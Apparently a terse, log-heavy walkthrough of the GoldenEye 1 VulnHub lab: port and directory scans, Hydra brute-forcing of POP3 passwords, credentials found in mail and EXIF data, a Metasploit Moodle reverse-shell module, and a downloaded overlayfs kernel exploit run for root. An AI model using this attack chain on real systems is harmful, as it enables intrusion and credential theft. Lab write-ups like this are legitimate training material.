
https://hackso.me/goldeneye-1-walkthrough/
http://www.anonhack.in/2018/07/goldeneye-1-walkthrough-vulnhub-vulnerable-machine/


Available information:

Kernel version: 3.13.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 14.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS





─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.16
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-14 14:37 CEST
Nmap scan report for 192.168.110.16
Host is up (0.00046s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
|_ssl-date: TLS randomness does not represent time
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES AUTH-RESP-CODE TOP USER SASL(PLAIN) STLS PIPELINING CAPA UIDL
|_ssl-date: TLS randomness does not represent time
MAC Address: 08:00:27:9E:14:84 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms 192.168.110.16

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.83 seconds



└─$ dirb http://192.168.110.16

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Apr 14 14:41:47 2021
URL_BASE: http://192.168.110.16/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.110.16/ ----
+ http://192.168.110.16/index.html (CODE:200|SIZE:252)                                    
+ http://192.168.110.16/server-status (CODE:403|SIZE:294)                                 
 
gobuster dir -u http://192.168.110.16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt



Severnaya Auxiliary Control Station
****TOP SECRET ACCESS****
Accessing Server Identity
Server Name:....................
GOLDENEYE

User: UNKNOWN
Naviagate to /sev-home/ to login 


└─$ curl http://192.168.110.16/terminal.js
...
//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//

...

Programme Python ?

s = [73,110,118,105,110,99,105,98,108,101,72,97,99,107,51,114]
''.join(chr(i) for i in s)
'InvincibleHack3r'


# for d in $(echo -n '&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;' | tr -d '&#' | tr ';' '\n'); do printf \\$(printf "%o" $d); done && echo
InvincibleHack3r


└─$ dirb  http://192.168.110.16/sev-home/ -u boris:InvincibleHack3r -X .php

gobuster dir -u http://192.168.110.16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --username boris --password  InvincibleHack3r -x php,txt


└─$ hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.110.16 -s 55006
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-14 22:10:31
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3s://192.168.110.16:55006/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
[55006][pop3] host: 192.168.110.16   login: boris   password: secret1!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-14 22:13:11
 



 By The Dark Raver
-----------------

START_TIME: Wed Apr 14 21:53:51 2021
URL_BASE: http://192.168.110.16/sev-home/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
AUTHORIZATION: boris:InvincibleHack3r
EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.110.16/sev-home/ ----
                                                                                          
-----------------
END_TIME: Wed Apr 14 21:54:00 2021
DOWNLOADED: 4612 - FOUND: 0
                                                                                           
┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
└─$ gobuster --help
Usage:
  gobuster [command]

Available Commands:
  dir         Uses directory/file enumeration mode
  dns         Uses DNS subdomain enumeration mode
  fuzz        Uses fuzzing mode
  help        Help about any command
  s3          Uses aws bucket enumeration mode
  version     shows the current version
  vhost       Uses VHOST enumeration mode

Flags:
      --delay duration    Time each thread waits between requests (e.g. 1500ms)
  -h, --help              help for gobuster
      --no-error          Don't display errors
  -z, --no-progress       Don't display progress
  -o, --output string     Output file to write results to (defaults to stdout)
  -p, --pattern string    File containing replacement patterns
  -q, --quiet             Don't print the banner and other noise
  -t, --threads int       Number of concurrent threads (default 10)
  -v, --verbose           Verbose output (errors)
  -w, --wordlist string   Path to the wordlist

Use "gobuster [command] --help" for more information about a command.
                                                                                           
┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
└─$ gobuster dir --help
Uses directory/file enumeration mode

Usage:
  gobuster dir [flags]

Flags:
  -f, --add-slash                       Append / to each request
  -c, --cookies string                  Cookies to use for the requests
  -d, --discover-backup                 Upon finding a file search for backup files
      --exclude-length ints             exclude the following content length (completely ignores the status). Supply multiple times to exclude multiple sizes.
  -e, --expanded                        Expanded mode, print full URLs
  -x, --extensions string               File extension(s) to search for
  -r, --follow-redirect                 Follow redirects
  -H, --headers stringArray             Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2'
  -h, --help                            help for dir
      --hide-length                     Hide the length of the body in the output
  -m, --method string                   Use the following HTTP method (default "GET")
  -n, --no-status                       Don't print status codes
  -k, --no-tls-validation               Skip TLS certificate verification
  -P, --password string                 Password for Basic Auth
      --proxy string                    Proxy to use for requests [http(s)://host:port]
      --random-agent                    Use a random User-Agent string
  -s, --status-codes string             Positive status codes (will be overwritten with status-codes-blacklist if set)
  -b, --status-codes-blacklist string   Negative status codes (will override status-codes if set) (default "404")
      --timeout duration                HTTP Timeout (default 10s)
  -u, --url string                      The target URL
  -a, --useragent string                Set the User-Agent string (default "gobuster/3.1.0")
  -U, --username string                 Username for Basic Auth
      --wildcard                        Force continued operation when wildcard found

Global Flags:
      --delay duration    Time each thread waits between requests (e.g. 1500ms)
      --no-error          Don't display errors
  -z, --no-progress       Don't display progress
  -o, --output string     Output file to write results to (defaults to stdout)
  -p, --pattern string    File containing replacement patterns
  -q, --quiet             Don't print the banner and other noise
  -t, --threads int       Number of concurrent threads (default 10)
  -v, --verbose           Verbose output (errors)
  -w, --wordlist string   Path to the wordlist
                                                                                           
┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
└─$ gobuster dir --help | grep user
  -a, --useragent string                Set the User-Agent string (default "gobuster/3.1.0")
  -U, --username string                 Username for Basic Auth
                                                                                           
┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
└─$ gobuster dir --help | grep Basic
  -P, --password string                 Password for Basic Auth
  -U, --username string                 Username for Basic Auth
                                                                                           
┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
└─$ gobuster dir -u http://192.168.110.16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --username boris --password  InvincibleHack3r -x php,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.110.16
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Auth User:               boris
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2021/04/14 21:56:10 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 294]
                                               
===============================================================
2021/04/14 22:01:09 Finished
===============================================================


└─$ hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.110.16 -s 55006
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-14 22:16:07
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3s://192.168.110.16:55006/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[55006][pop3] host: 192.168.110.16   login: natalya   password: bird
[STATUS] 111.00 tries/min, 222 tries in 00:02h, 1 to do in 00:01h, 15 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-14 22:18:07



┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
└─$ telnet 192.168.110.16 55007
Trying 192.168.110.16...
Connected to 192.168.110.16.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
user boris
+OK
pass secret1!
+OK Logged in.
list
+OK 3 messages:
1 544
2 373
3 921

retr 1  
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id D9E47454B1
        for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
.
retr 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id C3F2B454B1
        for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.
retr 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
        for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.

.

└─$ telnet 192.168.110.16 55007                                                        1 ⨯
Trying 192.168.110.16...
Connected to 192.168.110.16.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
user natalya
+OK
pass bird
+OK Logged in.
list
+OK 2 messages:
1 631
2 1048
.
retr 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id D5EDA454B1
        for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
retr 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: Xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.



http://severnaya-station.com/gnocertdir/blog/index.php?courseid=0



Messages:
 09:24 PM: Greetings Xenia,

As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.

My email username is...

doak

Thank you,

Cheers,

Dr. Doak "The Doctor"



└─$ hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.110.16 -s 55006
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-15 07:16:57
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3s://192.168.110.16:55006/
[55006][pop3] host: 192.168.110.16   login: doak   password: goat
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-15 07:18:43
       


└─$ telnet 192.168.110.16 55007
Trying 192.168.110.16...
Connected to 192.168.110.16.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
user doak                                                                               
+OK
pass goat
+OK Logged in.
list
+OK 1 messages:
1 606
.
retr 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 97DC24549D
        for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!



My private files
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.


┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
└─$ exiftool for-007.jpg  
ExifTool Version Number         : 12.16
File Name                       : for-007.jpg
Directory                       : .
File Size                       : 15 KiB
File Modification Date/Time     : 2018:04:25 02:40:02+02:00
File Access Date/Time           : 2021:04:15 07:26:04+02:00
File Inode Change Date/Time     : 2021:04:15 07:26:04+02:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 300
Y Resolution                    : 300
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : For 007
Flashpix Version                : 0100
Image Width                     : 313
Image Height                    : 212
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 313x212
Megapixels                      : 0.066
                                                                                           
┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
└─$ echo -n 'eFdpbnRlcjE5OTV4IQ==' | base64 -d                                        
xWinter1995x!                                        


msf6 exploit(multi/http/moodle_cmd_exec) > show options

Module options (exploit/multi/http/moodle_cmd_exec):

   Name       Current Setting        Required  Description
   ----       ---------------        --------  -----------
   PASSWORD   xWinter1995x!          yes       Password to authenticate with
   Proxies                           no        A proxy chain of format type:host:port[,ty
                                               pe:host:port][...]
   RHOSTS     severnaya-station.com  yes       The target host(s), range CIDR identifier,
                                                or hosts file with syntax 'file:<path>'
   RPORT      80                     yes       The target port (TCP)
   SESSKEY                           no        The session key of the user to impersonate
   SSL        false                  no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /gnocertdir/           yes       The URI of the Moodle installation
   USERNAME   admin                  yes       Username to authenticate with
   VHOST                             no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.110.1    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(multi/http/moodle_cmd_exec) > run

[*] Started reverse TCP double handler on 192.168.110.1:4444 
[*] Authenticating as user: admin
[-] Exploit aborted due to failure: no-access: Login failed
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/moodle_cmd_exec) > 


sh -c '/tmp/rev'




www-data@ubuntu:/tmp$ ls -al /home
ls -al /home
total 20
drwxr-xr-x  5 root    root    4096 Apr 29  2018 .
drwxr-xr-x 22 root    root    4096 Apr 24  2018 ..
drwxr-xr-x  4 boris   boris   4096 Apr 14 08:33 boris
drwxr-xr-x  4 doak    doak    4096 Apr 28  2018 doak
drwxr-xr-x  4 natalya natalya 4096 Apr 28  2018 natalya




[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: highly probable
   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292

www-data@ubuntu:/var/www/html/dir007key$ wget http://192.168.110.1:8888/37292
wget http://192.168.110.1:8888/37292
--2021-04-14 12:19:43--  http://192.168.110.1:8888/37292
Connecting to 192.168.110.1:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17592 (17K) [application/octet-stream]
Saving to: '37292'

100%[======================================>] 17,592      --.-K/s   in 0s      

2021-04-14 12:19:43 (289 MB/s) - '37292' saved [17592/17592]

www-data@ubuntu:/var/www/html/dir007key$ chmod +x 37292
chmod +x 37292
www-data@ubuntu:/var/www/html/dir007key$ ./37292
./37292
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)



# cat .flag.txt
cat .flag.txt
Alec told me to place the codes here: 

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/
